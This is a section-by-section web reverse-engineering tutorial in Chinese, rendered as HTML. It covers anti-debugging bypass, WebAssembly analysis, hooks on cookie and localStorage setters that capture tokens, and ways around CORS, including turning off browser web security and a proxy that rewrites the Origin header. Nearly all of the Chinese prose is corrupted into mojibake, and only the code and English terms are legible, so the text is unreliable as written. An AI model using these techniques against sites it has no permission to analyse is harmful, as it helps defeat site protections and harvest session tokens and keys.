<li><em>æ³¨æ„</em>: å¦‚æœä½¿ç”¨äº† jQuery æˆ– Vue/React æ¡†æ¶ï¼Œç›‘å¬å™¨å¯èƒ½ç»‘å®šåœ¨ <code>document</code> æˆ–çˆ¶èŠ‚ç‚¹ä¸Šï¼ˆäº‹ä»¶å§”æ‰˜ï¼‰ã€‚</li>
</ul>
</li>
<li><strong>DevTools -&gt; Sources -&gt; Event Listener Breakpoints</strong>: å‹¾é€‰ <code>Mouse -&gt; click</code>ã€‚ç‚¹å‡»æŒ‰é’®æ—¶æ–­ç‚¹ä¼šåœåœ¨äº‹ä»¶å¤„ç†å‡½æ•°çš„ç¬¬ä¸€è¡Œã€‚</li>
<li><strong>DOM æ–­ç‚¹</strong>:<ul>
<li><strong>Subtree modifications</strong>: ç›‘å¬å­èŠ‚ç‚¹å˜åŒ–ï¼ˆå¦‚åŠ¨æ€æ’å…¥äº†åŠ å¯†åçš„ tokenï¼‰ã€‚</li>
<li><strong>Attribute modifications</strong>: ç›‘å¬å±æ€§å˜åŒ–ï¼ˆå¦‚ class æ”¹å˜ï¼‰ã€‚</li>
<li><strong>Node removal</strong>: ç›‘å¬èŠ‚ç‚¹è¢«åˆ é™¤ã€‚</li>
</ul>
</li>
</ol>
<hr />
<h2>BOM (Browser Object Model)</h2>
<p>BOM æä¾›äº†ä¸æµè§ˆå™¨çª—å£äº¤äº’çš„å¯¹è±¡ï¼Œæ ¸å¿ƒæ˜¯ <code>window</code>ã€‚</p>
<h3>1. Window å¯¹è±¡</h3>
<p>å…¨å±€ä½œç”¨åŸŸå¯¹è±¡ï¼Œæ‰€æœ‰å…¨å±€å˜é‡ï¼ˆ<code>var</code>ï¼‰å’Œå‡½æ•°éƒ½æ˜¯å®ƒçš„å±æ€§ã€‚</p>
<ul>
<li><strong>é€†å‘æŠ€å·§</strong>: åœ¨ Console è¾“å…¥ <code>window</code> æˆ– <code>this</code> æŸ¥çœ‹æŒ‚è½½çš„å…¨å±€å¯¹è±¡ï¼Œå¸¸èƒ½å‘ç°æš´éœ²å‡ºæ¥çš„åŠ å¯†åº“ï¼ˆå¦‚ <code>window.encrypt_lib</code>ï¼‰ã€‚</li>
</ul>
<h3>2. Location (åœ°å€æ )</h3>
<p>ç®¡ç† URLã€‚</p>
<pre><code class="language-javascript">location.href; // å½“å‰å®Œæ•´ URL
location.search; // æŸ¥è¯¢å‚æ•° (?id=1&amp;token=abc)
location.reload(); // åˆ·æ–°é¡µé¢
location.replace(&quot;https://google.com&quot;); // è·³è½¬ä¸”ä¸ç•™å†å²è®°å½•
</code></pre>
<h3>3. History (å†å²è®°å½•)</h3>
<p>å•é¡µåº”ç”¨ (SPA) å¸¸åˆ©ç”¨ History API å®ç°å‰ç«¯è·¯ç”±ã€‚</p>
<pre><code class="language-javascript">history.pushState({}, &quot;&quot;, &quot;/new-path&quot;); // ä¿®æ”¹ URL ä½†ä¸åˆ·æ–°
</code></pre>
<h3>4. Screen &amp; Navigator (æŒ‡çº¹ä¸ç¯å¢ƒ)</h3>
<ul>
<li><code>screen.width</code> / <code>screen.height</code>: å±å¹•åˆ†è¾¨ç‡ã€‚</li>
<li><code>navigator.userAgent</code>: ç”¨æˆ·ä»£ç†å­—ç¬¦ä¸²ã€‚</li>
</ul>
<h4>[Reverse Engineering Context] åè°ƒè¯•æ£€æµ‹</h4>
<p>å¾ˆå¤šç«™ç‚¹ä¼šæ£€æµ‹ BOM å±æ€§æ¥åˆ¤æ–­æ˜¯å¦å¤„äºè°ƒè¯•æ¨¡å¼ã€‚</p>
<ol>
<li><p><strong>æ£€æµ‹çª—å£å¤§å°</strong>: å¼€å‘è€…å·¥å…·æ‰“å¼€æ—¶ï¼Œç½‘é¡µå¯è§†åŒºåŸŸ (<code>window.innerWidth</code> / <code>innerHeight</code>) ä¼šå˜å°ã€‚</p>
<pre><code class="language-javascript">setInterval(() =&gt; {
  if (window.outerWidth - window.innerWidth &gt; 160) {
    console.log(&quot;DevTools opened!&quot;);
  }
}, 1000);
</code></pre>
</li>
<li><p><strong>æ£€æµ‹ Console</strong>: é‡å†™ <code>console.log</code> æˆ–åˆ©ç”¨ <code>console.table</code> ç­‰æ–¹æ³•çš„ç‰¹æ®Šè¡Œä¸ºã€‚</p>
</li>
<li><p><strong>debugger è¯­å¥</strong>:</p>
<pre><code class="language-javascript">setInterval(() =&gt; {
  debugger; // å¦‚æœå¼€å¯äº† DevToolsï¼Œä¼šæ— é™æ–­ç‚¹å¡ä½é¡µé¢
}, 100);
</code></pre>
<ul>
<li><strong>å¯¹æŠ—</strong>:<ul>
<li>&quot;Never pause here&quot; (DevTools å³é”®æ–­ç‚¹è¡Œ)ã€‚</li>
<li>Hook <code>Function.prototype.constructor</code> (å¦‚æœæ˜¯ <code>Function(&quot;debugger&quot;)()</code> è¿™ç§å½¢å¼)ã€‚</li>
<li>æœ¬åœ°æ›¿æ¢ (Local Override) åˆ é™¤ <code>debugger</code> è¯­å¥ã€‚</li>
</ul>
</li>
</ul>
</li>
</ol>
<hr />
<h2>æ€»ç»“</h2>
<ul>
<li><strong>DOM</strong> æ˜¯å†…å®¹çš„è½½ä½“ï¼Œ<strong>é€†å‘æ ¸å¿ƒ</strong>æ˜¯åˆ©ç”¨ DOM æ–­ç‚¹å’Œäº‹ä»¶ç›‘å¬å™¨æ–­ç‚¹å¿«é€Ÿå®šä½ä¸šåŠ¡é€»è¾‘å…¥å£ã€‚</li>
<li><strong>BOM</strong> æ˜¯ç¯å¢ƒçš„æ¥å£ï¼Œ<strong>é€†å‘æ ¸å¿ƒ</strong>æ˜¯è¯†åˆ«å’Œç»•è¿‡åŸºäºæµè§ˆå™¨ç¯å¢ƒç‰¹å¾çš„åè°ƒè¯•/åçˆ¬è™«æ£€æµ‹ã€‚</li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-10">
                                                <h2>[R09] WebAssembly Basics</h2>
                                                <h1>R09: WebAssembly åŸºç¡€</h1>
<h2>æ¦‚è¿°</h2>
<p>WebAssembly (Wasm) æ˜¯ä¸€ç§äºŒè¿›åˆ¶æŒ‡ä»¤æ ¼å¼ï¼Œå…è®¸åœ¨ Web ä¸Šè¿è¡Œé«˜æ€§èƒ½ä»£ç ï¼ˆå¦‚ C/C++/Rust ç¼–è¯‘è€Œæ¥ï¼‰ã€‚éšç€è¶Šæ¥è¶Šå¤šçš„æ ¸å¿ƒç®—æ³•ï¼ˆåŠ å¯†ã€è§£ç ã€å¤æ‚é€»è¾‘ï¼‰è¢«è¿ç§»åˆ° Wasmï¼Œé€†å‘ Wasm å·²æˆä¸ºç°ä»£ Web é€†å‘çš„å¿…å¤‡æŠ€èƒ½ã€‚</p>
<hr />
<h2>Wasm æ˜¯ä»€ä¹ˆï¼Ÿ</h2>
<h3>1. æ ¸å¿ƒç‰¹æ€§</h3>
<ul>
<li><strong>äºŒè¿›åˆ¶æ ¼å¼ (<code>.wasm</code>)</strong>: ç´§å‡‘ï¼ŒåŠ è½½å¿«ï¼Œä½†ä¸å¯è¯»ã€‚</li>
<li><strong>æ–‡æœ¬æ ¼å¼ (<code>.wat</code>)</strong>: Wasm çš„æ±‡ç¼–å½¢å¼ï¼ŒS-expression é£æ ¼ï¼Œå¯è¯»æ€§å°šå¯ã€‚</li>
<li><strong>çº¿æ€§å†…å­˜ (Linear Memory)</strong>: Wasm åªèƒ½è®¿é—®ä¸€å—è¿ç»­çš„ ArrayBufferï¼Œé€šè¿‡ä¸‹æ ‡è¯»å†™ã€‚</li>
<li><strong>æ ˆå¼è™šæ‹Ÿæœº</strong>: æŒ‡ä»¤åŸºäºæ“ä½œæ•°æ ˆï¼Œä¾‹å¦‚ <code>i32.add</code> ä¼šä»æ ˆé¡¶å¼¹å‡ºä¸¤ä¸ªæ•°ï¼Œç›¸åŠ åç»“æœå‹æ ˆã€‚</li>
</ul>
<h3>2. JS ä¸ Wasm äº’æ“ä½œ</h3>
<p>Wasm æ¨¡å—éœ€è¦ JS æ¥åŠ è½½å’Œå®ä¾‹åŒ–ã€‚</p>
<pre><code class="language-javascript">// è¿™é‡Œå¯ä»¥ Hook !
WebAssembly.instantiate(buffer, imports).then((results) =&gt; {
  // results.instance.exports åŒ…å« Wasm å¯¼å‡ºçš„å‡½æ•°
});
</code></pre>
<hr />
<h2>Wasm é€†å‘æµç¨‹</h2>
<h3>1. è·å– Wasm æ–‡ä»¶</h3>
<p>é€šå¸¸åœ¨ Network é¢æ¿å¯ä»¥çœ‹åˆ° <code>.wasm</code> æ–‡ä»¶çš„è¯·æ±‚ã€‚</p>
<ul>
<li><em>æ³¨æ„</em>: æœ‰äº›ç«™ç‚¹ä¼šå°† Wasm äºŒè¿›åˆ¶æ•°æ®ç¡¬ç¼–ç åœ¨ JS å­—ç¬¦ä¸²æˆ– ArrayBuffer ä¸­ï¼Œç„¶ååŠ¨æ€åŠ è½½ã€‚å¯ä»¥é€šè¿‡ Hook <code>WebAssembly.instantiate</code> æ¥æ•è· bufferã€‚</li>
</ul>
<h3>2. é™æ€åˆ†æ (Disassembly / Decompilation)</h3>
<p>æ‹¿åˆ° <code>.wasm</code> æ–‡ä»¶åï¼Œéœ€è¦å°†å…¶è¿˜åŸä¸ºå¯è¯»ä»£ç ã€‚</p>
<ul>
<li><strong>wasm2wat (WABT å·¥å…·åŒ…)</strong>: è½¬æ¢ä¸º <code>.wat</code> æ±‡ç¼–ã€‚<pre><code class="language-lisp">(func $add (param $p0 i32) (param $p1 i32) (result i32)
  local.get $p0
  local.get $p1
  i32.add)
</code></pre>
</li>
<li><strong>Decompilers (åç¼–è¯‘å™¨)</strong>: å°è¯•è¿˜åŸä¸ºç±» C ä»£ç ï¼ˆä¼ªä»£ç ï¼‰ã€‚<ul>
<li><strong>JEB Decompiler</strong>: å•†ä¸šè½¯ä»¶ï¼Œåç¼–è¯‘æ•ˆæœè¾ƒå¥½ã€‚</li>
<li><strong>Ghidra</strong>: éœ€è¦å®‰è£… Wasm æ’ä»¶ã€‚</li>
<li><strong>wasm-decompile</strong>: WABT è‡ªå¸¦ï¼Œè¾“å‡ºç±»ä¼¼ C çš„ä¼ªä»£ç ã€‚</li>
</ul>
</li>
</ul>
<h3>3. åŠ¨æ€è°ƒè¯•</h3>
<p>Chrome DevTools å·²ç»å¾ˆå¥½åœ°æ”¯æŒ Wasm è°ƒè¯•ã€‚</p>
<ol>
<li>Sources é¢æ¿ -&gt; æ‰¾åˆ° <code>wasm</code> æ–‡ä»¶ï¼ˆé€šå¸¸åœ¨ <code>wasm://</code> åè®®ä¸‹ï¼‰ã€‚</li>
<li>ç‚¹å‡»ä»£ç è¡Œå·ä¸‹æ–­ç‚¹ã€‚</li>
<li>å•æ­¥è°ƒè¯•ï¼Œè§‚å¯Ÿ Stackï¼ˆæ ˆï¼‰å’Œ Memoryï¼ˆå†…å­˜ï¼‰çš„å˜åŒ–ã€‚</li>
</ol>
<hr />
<h2>å…³é”®é€†å‘æŠ€å·§</h2>
<h3>1. å¯»æ‰¾å¯¼å‡ºå‡½æ•° (Exports)</h3>
<p>Wasm æ¨¡å—é€šå¸¸ä¼šå¯¼å‡ºä¸€ä¸ªå…¥å£å‡½æ•°ç»™ JS è°ƒç”¨ï¼ˆå¦‚ <code>encrypt</code>, <code>hash</code>ï¼‰ã€‚è¿™æ˜¯æˆ‘ä»¬åˆ†æçš„èµ·ç‚¹ã€‚</p>
<h3>2. åˆ†æå¯¼å…¥å‡½æ•° (Imports)</h3>
<p>Wasm ç»å¸¸éœ€è¦è°ƒç”¨ JS å‡½æ•°ï¼ˆå› ä¸º Wasm ä¸èƒ½ç›´æ¥æ“ä½œ DOM æˆ–å‘é€ç½‘ç»œè¯·æ±‚ï¼‰ã€‚</p>
<ul>
<li>æŸ¥çœ‹ Imports åˆ—è¡¨ï¼Œå¦‚æœå‘ç°å¯¼å…¥äº† <code>console.log</code> æˆ–è€…ç½‘ç»œç›¸å…³çš„ JS å‡½æ•°ï¼Œå¯ä»¥åœ¨è¿™äº› JS å‡½æ•°ä¸Š Hookï¼Œä»è€Œçª¥æ¢ Wasm å†…éƒ¨çŠ¶æ€ã€‚</li>
</ul>
<h3>3. å†…å­˜è§†å›¾</h3>
<p>Wasm çš„å†…å­˜æ˜¯ä¸€ä¸ª <code>WebAssembly.Memory</code> å¯¹è±¡ï¼Œæœ¬è´¨ä¸Šæ˜¯ JS çš„ <code>ArrayBuffer</code>ã€‚</p>
<ul>
<li>ä»»ä½•æ—¶å€™ï¼Œä½ éƒ½å¯ä»¥é€šè¿‡ JS è¯»å–è¿™å—å†…å­˜ï¼š<pre><code class="language-javascript">let mem = instance.exports.memory;
let view = new Uint8Array(mem.buffer);
console.log(view.slice(0, 100)); // æŸ¥çœ‹å‰100å­—èŠ‚
</code></pre>
</li>
<li>å¦‚æœ Wasm åœ¨è¿›è¡ŒåŠ å¯†æ“ä½œï¼Œå¯†é’¥å¾€å¾€å°±åœ¨è¿™å—å†…å­˜é‡Œã€‚</li>
</ul>
<hr />
<h2>æ€»ç»“</h2>
<p>Wasm é€†å‘ = <strong>äºŒè¿›åˆ¶åˆ†æ</strong> (IDA/Ghidra) + <strong>Web åŠ¨æ€è°ƒè¯•</strong> (DevTools)ã€‚è™½ç„¶é—¨æ§›æ¯”çº¯ JS é€†å‘é«˜ï¼Œä½†æ ¸å¿ƒé€»è¾‘ä¾ç„¶æ˜¯ï¼šè¾“å…¥ -&gt; [é»‘ç›’å¤„ç†] -&gt; è¾“å‡ºã€‚åªè¦èƒ½æ§åˆ¶è¾“å…¥è¾“å‡ºï¼Œå¹¶æœ‰èƒ½åŠ›çª¥æ¢é»‘ç›’å†…éƒ¨ï¼ˆHook Imports, Dump Memoryï¼‰ï¼Œå°±èƒ½æ”»å…‹ã€‚</p>

                                            </div>
                                            
                                            <div class="section" id="section-11">
                                                <h2>[R10] Cookie And Storage</h2>
                                                <h1>R10: Cookie ä¸ Storage</h1>
<h2>æ¦‚è¿°</h2>
<p>Web åº”ç”¨éœ€è¦åœ¨å®¢æˆ·ç«¯å­˜å‚¨æ•°æ®ï¼Œç”¨äºç»´æŒä¼šè¯çŠ¶æ€ï¼ˆSessionï¼‰ã€ä¿å­˜ç”¨æˆ·åå¥½æˆ–ç¼“å­˜æ•°æ®ã€‚åœ¨é€†å‘å·¥ç¨‹ä¸­ï¼Œè¿™äº›å­˜å‚¨ä½ç½®å¾€å¾€æ˜¯å¯»æ‰¾ Tokenã€å¯†é’¥æˆ–æ•æ„Ÿä¿¡æ¯çš„é¦–é€‰ä¹‹åœ°ã€‚</p>
<hr />
<h2>Cookie</h2>
<p>Cookie æ˜¯æœ€æ—©çš„å®¢æˆ·ç«¯å­˜å‚¨æœºåˆ¶ï¼Œä¸»è¦ç”¨äº HTTP çŠ¶æ€ç®¡ç†ã€‚</p>
<h3>1. ç»“æ„ä¸å±æ€§</h3>
<p>ä¸€ä¸ª Cookie åŒ…å«ä»¥ä¸‹å…³é”®å±æ€§ï¼š</p>
<ul>
<li><strong>Name/Value</strong>: é”®å€¼å¯¹ã€‚</li>
<li><strong>Domain/Path</strong>: ä½œç”¨åŸŸã€‚</li>
<li><strong>Expires/Max-Age</strong>: æœ‰æ•ˆæœŸã€‚</li>
<li><strong>HttpOnly</strong>: <strong>å…³é”®å±æ€§</strong>ã€‚å¦‚æœè®¾ç½®ä¸º <code>true</code>ï¼ŒJS æ— æ³•è¯»å–ï¼ˆ<code>document.cookie</code> è¯»ä¸åˆ°ï¼‰ï¼Œä½†è¿™ä¸å½±å“æŠ“åŒ…ã€‚è¿™ä¸»è¦æ˜¯ä¸ºäº†é˜²æ­¢ XSS æ”»å‡»çªƒå– Cookieã€‚</li>
<li><strong>Secure</strong>: ä»…é€šè¿‡ HTTPS ä¼ è¾“ã€‚</li>
<li><strong>SameSite</strong>: <code>Strict</code> / <code>Lax</code> / <code>None</code>ï¼Œé™åˆ¶è·¨ç«™è¯·æ±‚æºå¸¦ Cookieï¼ˆé˜²æ­¢ CSRFï¼‰ã€‚</li>
</ul>
<h3>2. [Reverse Engineering Context] Cookie é€†å‘</h3>
<ul>
<li><strong>Hook Setter</strong>: å¦‚å‰æ–‡æ‰€è¿°ï¼ŒHook <code>document.cookie</code> çš„ setter å¯ä»¥å®šä½ JS æ˜¯åœ¨å“ªé‡Œç”Ÿæˆ/è®¾ç½® Cookie çš„ã€‚<pre><code class="language-javascript">var cookie_cache = document.cookie;
Object.defineProperty(document, &quot;cookie&quot;, {
  get: function () {
    return cookie_cache;
  },
  set: function (val) {
    console.log(&quot;Setting cookie&quot;, val);
    cookie_cache = val;
    return val;
  },
});
</code></pre>
</li>
<li><strong>HttpOnly Bypass?</strong>: å¦‚æœ Cookie æ˜¯ HttpOnly çš„ï¼Œä½ æ— æ³•é€šè¿‡ JS Hook æ‹¿åˆ°ï¼ˆå› ä¸ºæµè§ˆå™¨å†…æ ¸é˜»æ­¢äº†ï¼‰ã€‚ä½†ä½ å¯ä»¥ï¼š<ol>
<li>æŠ“åŒ…ï¼ˆBurp/Fiddler/Network Panelï¼‰ã€‚</li>
<li>å¦‚æœæ˜¯ Electron åº”ç”¨ï¼Œå¯ä»¥å°è¯•è°ƒè¯•ä¸»è¿›ç¨‹æˆ–ä½¿ç”¨ Protocol Monitorã€‚</li>
</ol>
</li>
</ul>
<hr />
<h2>Web Storage (Local / Session)</h2>
<p>HTML5 å¼•å…¥çš„é”®å€¼å¯¹å­˜å‚¨ï¼Œæ¯” Cookie æ›´å¤§ï¼ˆ~5MBï¼‰ï¼Œæ¥å£æ›´ç®€å•ã€‚</p>
<h3>1. LocalStorage vs SessionStorage</h3>
<ul>
<li><strong>LocalStorage</strong>: æŒä¹…åŒ–å­˜å‚¨ï¼Œé™¤éä¸»åŠ¨åˆ é™¤ï¼Œå¦åˆ™ä¸€ç›´å­˜åœ¨ã€‚</li>
<li><strong>SessionStorage</strong>: ä¼šè¯çº§å­˜å‚¨ï¼Œå…³é—­æ ‡ç­¾é¡µåæ¶ˆå¤±ã€‚</li>
</ul>
<h3>2. API</h3>
<ul>
<li><code>getItem(key)</code></li>
<li><code>setItem(key, value)</code></li>
<li><code>removeItem(key)</code></li>
<li><code>clear()</code></li>
</ul>
<h3>3. [Reverse Engineering Context] ç›‘æ§å­˜å‚¨</h3>
<p>å¾ˆå¤š JWT (JSON Web Token) å­˜å‚¨åœ¨ LocalStorage ä¸­ã€‚</p>
<pre><code class="language-javascript">// ç®€å•çš„ Hook ç›‘æ§ setItem
const originalSetItem = localStorage.setItem;
localStorage.setItem = function (key, value) {
  if (key === &quot;token&quot;) {
    console.log(&quot;[LocalStorage] Token detected:&quot;, value);
    debugger;
  }
  return originalSetItem.apply(this, arguments);
};
</code></pre>
<p><strong>å®æˆ˜æŠ€å·§</strong>: åœ¨ DevTools çš„ Application é¢æ¿å¯ä»¥ç›´æ¥æŸ¥çœ‹å’Œç¼–è¾‘ Storage æ•°æ®ã€‚</p>
<hr />
<h2>IndexedDB</h2>
<p>æµè§ˆå™¨å†…ç½®çš„éå…³ç³»å‹æ•°æ®åº“ï¼Œç”¨äºå­˜å‚¨å¤§é‡ç»“æ„åŒ–æ•°æ®ã€‚</p>
<h3>1. ç‰¹ç‚¹</h3>
<ul>
<li>æ”¯æŒäº‹åŠ¡ã€‚</li>
<li>æ”¯æŒç´¢å¼•ã€‚</li>
<li>å¼‚æ­¥ APIã€‚</li>
</ul>
<h3>2. é€†å‘åœºæ™¯</h3>
<p>è¾ƒå°‘ç”¨äºå­˜å‚¨ç®€å•çš„ Tokenï¼Œä½†åœ¨å¤æ‚çš„ Web Appï¼ˆå¦‚åœ¨çº¿æ–‡æ¡£ã€å³æ—¶é€šè®¯ã€ç¦»çº¿åº”ç”¨ï¼‰ä¸­ï¼Œå¯èƒ½ä¼šç¼“å­˜å¤§é‡çš„ä¸šåŠ¡æ•°æ®ç”šè‡³ä»£ç é€»è¾‘ã€‚å¦‚æœå‘ç°åº”ç”¨åœ¨ Application é¢æ¿çš„ IndexedDB é‡Œå­˜äº†å¾ˆå¤šæ•°æ®ï¼Œå€¼å¾—çœ‹ä¸€çœ¼ã€‚</p>
<hr />
<h2>æ€»ç»“</h2>
<table>
<thead>
<tr>
  <th style="text-align:left">å­˜å‚¨ç±»å‹</th>
  <th style="text-align:left">å®¹é‡</th>
  <th style="text-align:left">ç”Ÿå‘½å‘¨æœŸ</th>
  <th style="text-align:left">JS å¯è®¿é—®æ€§</th>
  <th style="text-align:left">é€†å‘å…³æ³¨ç‚¹</th>
</tr>
</thead>
<tbody>
<tr>
  <td style="text-align:left"><strong>Cookie</strong></td>
  <td style="text-align:left">4KB</td>
  <td style="text-align:left">å¯è®¾ / ä¼šè¯</td>
  <td style="text-align:left">å–å†³äº HttpOnly</td>
  <td style="text-align:left">Session ID, ç­¾åå‚æ•°</td>
</tr>
<tr>
  <td style="text-align:left"><strong>LocalStorage</strong></td>
  <td style="text-align:left">5MB</td>
  <td style="text-align:left">æ°¸ä¹…</td>
  <td style="text-align:left">æ˜¯</td>
  <td style="text-align:left">JWT Token, ç”¨æˆ·é…ç½®</td>
</tr>
<tr>
  <td style="text-align:left"><strong>SessionStorage</strong></td>
  <td style="text-align:left">5MB</td>
  <td style="text-align:left">Tab å…³é—­</td>
  <td style="text-align:left">æ˜¯</td>
  <td style="text-align:left">ä¸´æ—¶çŠ¶æ€</td>
</tr>
<tr>
  <td style="text-align:left"><strong>IndexedDB</strong></td>
  <td style="text-align:left">æ— é™</td>
  <td style="text-align:left">æ°¸ä¹…</td>
  <td style="text-align:left">æ˜¯</td>
  <td style="text-align:left">å¤§é‡ä¸šåŠ¡æ•°æ®</td>
</tr>
</tbody>
</table>
<p><strong>é€†å‘ç¬¬ä¸€æ­¥</strong>: F12 -&gt; Application é¢æ¿ï¼ŒæŠŠè¿™å‡ ä¸ªåœ°æ–¹ç¿»ä¸€éï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰åä¸º <code>token</code>, <code>auth</code>, <code>sign</code>, <code>key</code> çš„å¯ç–‘å­—æ®µã€‚</p>

                                            </div>
                                            
                                            <div class="section" id="section-12">
                                                <h2>[R11] CORS And Same Origin Policy</h2>
                                                <h1>R11: CORS ä¸åŒæºç­–ç•¥</h1>
<h2>æ¦‚è¿°</h2>
<p>åŒæºç­–ç•¥ (Same-Origin Policy, SOP) æ˜¯æµè§ˆå™¨æœ€æ ¸å¿ƒçš„å®‰å…¨æœºåˆ¶ï¼Œè€Œ CORS (Cross-Origin Resource Sharing) æ˜¯ SOP çš„å„ç§ &quot;ä¾‹å¤–&quot; ä¹‹ä¸€ã€‚ç†è§£å®ƒä»¬å¯¹äºè°ƒè¯• API è¯·æ±‚å¤±è´¥ã€è·¨åŸŸæ³¨å…¥æ”»å‡»ä»¥åŠæœ¬åœ°æ­å»ºæµ‹è¯•ç¯å¢ƒè‡³å…³é‡è¦ã€‚</p>
<hr />
<h2>åŒæºç­–ç•¥ (SOP)</h2>
<h3>1. å®šä¹‰</h3>
<p>ä¸¤ä¸ª URL è¯´å®ƒä»¬æ˜¯â€œåŒæºâ€çš„ï¼Œå¿…é¡»æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶å®Œå…¨ç›¸åŒï¼š</p>
<ol>
<li><strong>åè®® (Protocol)</strong>: éƒ½æ˜¯ <code>http</code> æˆ–éƒ½æ˜¯ <code>https</code>ã€‚</li>
<li><strong>åŸŸå (Domain)</strong>: å¦‚ <code>www.example.com</code>ã€‚</li>
<li><strong>ç«¯å£ (Port)</strong>: å¦‚ <code>80</code>, <code>443</code>ã€‚</li>
</ol>
<p>å¦‚æœä¸åŒæºï¼Œæµè§ˆå™¨ä¼šé™åˆ¶ï¼š</p>
<ul>
<li><strong>Cookie, LocalStorage, IndexedDB</strong> è¯»å–ã€‚</li>
<li><strong>DOM</strong> è®¿é—® (å¦‚ iframe)ã€‚</li>
<li><strong>AJAX</strong> è¯·æ±‚å‘é€ (å®é™…ä¸Šè¯·æ±‚é€šå¸¸èƒ½å‘å‡ºï¼Œä½†å“åº”ä¼šè¢«æµè§ˆå™¨æ‹¦æˆªï¼Œé™¤éæœåŠ¡å™¨å…è®¸ CORS)ã€‚</li>
</ul>
<h3>2. [Reverse Engineering Context] ä¸ºä»€ä¹ˆæˆ‘çš„æœ¬åœ°æµ‹è¯•å¤±è´¥äº†ï¼Ÿ</h3>
<p>å¾ˆå¤šæ—¶å€™ï¼Œä½ æŠŠåˆ«äººçš„ JS ä»£ç  down ä¸‹æ¥ï¼Œåœ¨æœ¬åœ°å¼€ä¸ª <code>file://</code> æˆ– <code>localhost:8000</code> è¿è¡Œï¼Œç»“æœå‘ç° API è¯·æ±‚å…¨éƒ½æŠ¥çº¢ï¼š
<code>Access to fetch at ... from origin ... has been blocked by CORS policy</code>ã€‚</p>
<p><strong>åŸå› </strong>: ç›®æ ‡æœåŠ¡å™¨åªå…è®¸ç‰¹å®šçš„åŸŸåï¼ˆå®ƒçš„å®˜ç½‘ï¼‰è®¿é—®ï¼Œä½ çš„ <code>localhost</code> ä¸æ˜¯å®ƒå…è®¸çš„æºã€‚</p>
<hr />
<h2>CORS (è·¨åŸŸèµ„æºå…±äº«)</h2>
<p>CORS æ˜¯ä¸€ç§æœºåˆ¶ï¼Œå®ƒä½¿ç”¨é¢å¤–çš„ HTTP å¤´æ¥å‘Šè¯‰æµè§ˆå™¨ï¼šè®©è¿è¡Œåœ¨ä¸€ä¸ª origin (domain) ä¸Šçš„ Web åº”ç”¨è¢«å‡†è®¸è®¿é—®æ¥è‡ªä¸åŒæºæœåŠ¡å™¨ä¸Šçš„æŒ‡å®šçš„èµ„æºã€‚</p>
<h3>1. ç®€å•è¯·æ±‚ vs é¢„æ£€è¯·æ±‚</h3>
<ul>
<li><p><strong>ç®€å•è¯·æ±‚</strong>: (GET, POST, HEAD, ä¸” Content-Type æ˜¯ application/x-www-form-urlencoded, multipart/form-data, text/plain ä¹‹ä¸€)ã€‚</p>
<ul>
<li>æµè§ˆå™¨ç›´æ¥å‘è¯·æ±‚ã€‚</li>
<li>çœ‹å“åº”å¤´æœ‰æ²¡æœ‰ <code>Access-Control-Allow-Origin</code>ã€‚</li>
</ul>
</li>
<li><p><strong>é¢„æ£€è¯·æ±‚ (Preflight)</strong>: (å¸¦è‡ªå®šä¹‰ Header, æˆ– Content-Type æ˜¯ application/json ç­‰)ã€‚</p>
<ul>
<li>æµè§ˆå™¨å…ˆå‘ä¸€ä¸ª <code>OPTIONS</code> æ–¹æ³•çš„è¯·æ±‚ã€‚</li>
<li>æœåŠ¡å™¨åŒæ„äº† (<code>Access-Control-Allow-Methods</code>, <code>Access-Control-Allow-Headers</code>)ï¼Œæµè§ˆå™¨æ‰å‘çœŸæ­£çš„è¯·æ±‚ã€‚</li>
</ul>
</li>
</ul>
<h3>2. å…³é”®å“åº”å¤´</h3>
<ul>
<li><code>Access-Control-Allow-Origin</code>: <code>*</code> æˆ– <code>https://your-site.com</code>ã€‚</li>
<li><code>Access-Control-Allow-Credentials</code>: <code>true</code> (å…è®¸å¸¦ Cookie)ã€‚</li>
</ul>
<hr />
<h2>é€†å‘ä¸­çš„ CORS ç»•è¿‡æŠ€å·§</h2>
<p>å½“ä½ éœ€è¦æœ¬åœ°è°ƒè¯•ç›®æ ‡ç½‘ç«™çš„ APIï¼Œæˆ–è€…åœ¨è‡ªå·±çš„ç½‘ç«™ä¸Šè°ƒç”¨åˆ«äººçš„ API æ—¶ï¼Œå¿…é¡»å¤„ç† CORSã€‚</p>
<h3>1. æµè§ˆå™¨æ’ä»¶ / å¯åŠ¨å‚æ•°</h3>
<p>æœ€ç®€å•çš„æ–¹æ³•æ˜¯å…³æ‰æµè§ˆå™¨çš„å®‰å…¨ç­–ç•¥ï¼ˆä»…é™è°ƒè¯•ç”¨ï¼ï¼‰ã€‚</p>
<ul>
<li><strong>Chrome å¯åŠ¨å‚æ•°</strong>: <code>--disable-web-security --user-data-dir=&quot;/tmp/xxxx&quot;</code>ã€‚</li>
</ul>
<h3>2. é…ç½®åå‘ä»£ç† (Reverse Proxy)</h3>
<p>è¿™æ˜¯æœ€ç¨³å¥çš„æ–¹æ³•ã€‚ä½¿ç”¨ Nginx æˆ– Node.js ä¸­é—´ä»¶ï¼ŒæŠŠä½ çš„è¯·æ±‚â€œä¼ªè£…â€æˆåŒæºã€‚</p>
<p><strong>åœºæ™¯</strong>:</p>
<ul>
<li>æœ¬åœ°å¼€å‘ç¯å¢ƒ: <code>localhost:3000</code></li>
<li>ç›®æ ‡ API: <code>api.target.com</code></li>
</ul>
<p><strong>Node.js ä»£ç† (http-proxy-middleware)</strong>:</p>
<pre><code class="language-javascript">// ä½ å‘ç»™ localhost:3000/api/xxx
// ä»£ç†è½¬å‘ç»™ api.target.com/api/xxx
// å¹¶åœ¨è½¬å‘æ—¶ä¿®æ”¹ Origin å¤´ï¼Œæ¬ºéª—æœåŠ¡å™¨
pathRewrite: {'^/api': ''},
changeOrigin: true, // å…³é”®ï¼šæŠŠè¯·æ±‚å¤´ä¸­çš„ Host/Origin ä¿®æ”¹ä¸ºç›®æ ‡åŸŸå
</code></pre>
<h3>3. JSONP (è¿‡æ—¶ä½†ä»å­˜åœ¨)</h3>
<p>è€æ—§çš„è·¨åŸŸæ–¹æ¡ˆï¼Œåˆ©ç”¨ <code>&lt;script&gt;</code> æ ‡ç­¾ä¸å— SOP é™åˆ¶çš„ç‰¹æ€§ã€‚</p>
<ul>
<li><strong>ç‰¹å¾</strong>: URL é‡Œæœ‰ä¸ª <code>callback=xxx</code>ã€‚</li>
